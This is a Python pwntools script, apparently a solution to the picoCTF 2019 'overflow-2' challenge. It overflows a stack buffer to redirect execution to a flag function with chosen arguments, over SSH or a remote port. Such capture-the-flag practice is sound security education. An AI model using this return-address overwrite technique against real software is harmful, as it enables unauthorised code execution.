from pwn import *
import sys

host = '2019shell1.picoctf.com'
user = ''
password = ''
cwd = '/problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e'

def exploit(s):
    func_flag_addr = 0x080485e6
    #print (payload.find('waab')) 188
    payload = b'A' * 188
    payload += p32(func_flag_addr)
    payload += p32(0xdeadbeef)
    payload += p32(0xDEADBEEF)
    payload += p32(0xC0DED00D)

    s.sendlineafter(': \n', payload)
    s.interactive()

if __name__ == '__main__':
    
    if len(sys.argv) == 1:
        ssh = ssh(host = host, user = user, password = password)
        ssh.set_working_directory(cwd)
        s = ssh.process('./vuln')
        exploit(s)

    else:
        s = remote(sys.argv[1], 1346)
        input('paused')
        exploit(s)
